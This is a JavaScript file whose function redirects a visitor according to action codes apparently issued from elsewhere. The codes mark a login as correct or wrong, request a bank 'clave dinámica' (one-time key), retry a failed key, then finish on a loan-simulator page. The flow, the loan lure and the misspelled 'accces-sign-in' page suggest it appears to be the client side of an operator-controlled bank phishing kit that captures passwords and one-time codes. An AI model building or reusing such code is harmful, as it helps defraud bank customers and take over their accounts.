// ================================================================
// js/actions.js
// ================================================================

async function handleAction(action, transactionId) {
  const loadingSpinner = document.querySelector(".loadingContainer");
  const errorLogin = document.getElementById("error-login");
  
  console.log("🎯 Manejando acción:", action);
  
  // Extraer el tipo de acción (antes de los dos puntos)
  const actionType = action.split(':')[0];
  
  switch (actionType) {
    case 'correcto':
      console.log("✅ Redirigiendo a loan-simulator...");
      window.location.href = "loan-simulator.html";
      break;
      
    case 'incorrecto':
    case 'error_login':
      console.log("❌ Datos incorrectos, volviendo al login...");
      window.location.href = "accces-sign-in.html?error=1";
      break;
      
    case 'pedir_dinamica':
      console.log("🔐 Solicitando clave dinámica...");
      window.location.href = "auth-dinamica.html";
      break;
      
    case 'error_dinamica':
      console.log("⚠️ Error en la dinámica...");
      if (loadingSpinner) loadingSpinner.style.display = "none";
      const errorMessage = document.querySelector(".errorMessage");
      if (errorMessage) {
        errorMessage.style.display = "block";
        errorMessage.style.opacity = "1";
        errorMessage.style.transform = "translateY(0)";
        setTimeout(() => {
          errorMessage.style.opacity = "0";
          errorMessage.style.transform = "translateY(20px)";
        }, 5000);
      }
      setTimeout(() => {
        window.location.href = "auth-dinamica.html";
      }, 5000);
      break;
      
    case 'finish':
      console.log("✔️ Proceso finalizado");
      if (loadingSpinner) loadingSpinner.style.display = "none";
      const finishContainer = document.querySelector(".finishContainer");
      const sectionTeclado = document.querySelector("#keyboard");
      if (finishContainer) finishContainer.style.display = "block";
      if (sectionTeclado) sectionTeclado.style.display = "none";
      setTimeout(() => {
        window.location.href = "../index.html";
      }, 3000);
      break;
      
    default:
      console.error("❌ Acción desconocida:", action);
      if (loadingSpinner) loadingSpinner.style.display = "none";
      alert("Error en la validación. Por favor intenta nuevamente.");
      window.location.href = "accces-sign-in.html";
  }
}
